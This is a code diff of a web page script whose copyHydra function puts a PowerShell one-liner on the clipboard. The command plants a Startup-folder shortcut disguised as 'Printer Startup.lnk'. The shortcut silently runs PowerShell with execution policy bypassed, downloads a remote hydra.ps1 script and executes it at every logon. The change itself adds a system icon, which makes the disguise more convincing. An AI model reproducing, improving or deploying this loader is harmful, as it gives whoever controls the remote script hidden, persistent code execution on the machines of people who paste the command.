@@ -31,7 +31,7 @@
     }
 
     function copyHydra() {
-        navigator.clipboard.writeText(`$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$Shortcut.Save();exit;`)
+        navigator.clipboard.writeText(`$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut("$Home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Printer Startup.lnk");$Shortcut.TargetPath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";$Shortcut.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo "(Invoke-Webrequest \\"https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1\\").content | powershell.exe"';$shortcut.IconLocation="shell32.dll,105";$Shortcut.Save();exit;`)
     }
 
     function clear($event) {
